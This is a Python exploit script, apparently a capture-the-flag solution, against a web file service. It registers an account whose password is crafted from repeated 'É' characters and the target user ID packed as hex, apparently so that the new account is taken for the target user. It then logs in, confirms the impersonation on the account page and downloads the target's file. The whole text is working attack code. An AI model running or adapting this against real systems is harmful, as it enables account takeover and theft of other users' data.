#!/usr/bin/env python3

import os
import struct
import sys

import requests

baseurl = sys.argv[1]
_, target_uid, _, target_fid = sys.argv[2].split(':')
target_uid = int(target_uid)
target_fid = int(target_fid)

username = os.urandom(32).hex().encode('utf-8')
password = (os.urandom(8).hex() + 'É'*16 + struct.pack('>Q', target_uid).hex().upper()).encode('utf-8')

print('Target user ID:', target_uid)
print('Target file ID:', target_fid)
print('Exploit username:', repr(username))
print('Exploit password:', repr(password))

session = requests.Session()
res = session.post(baseurl + '/register', data={'username': username, 'password': password}, allow_redirects=False)
assert res.status_code == 307, res
res = session.post(baseurl + '/login', data={'username': username, 'password': password}, allow_redirects=False)
assert res.status_code == 303, res
res = session.post(baseurl + '/account', allow_redirects=False)
assert res.status_code == 200, res
assert '<td>' + str(target_uid) + '</td>' in res.text, res.text
assert '<a href="/download?' + str(target_fid) + '">' in res.text, res.text
res = session.post(baseurl + '/download?' + str(target_fid), allow_redirects=False)
assert res.status_code == 200, res
print(res.text)
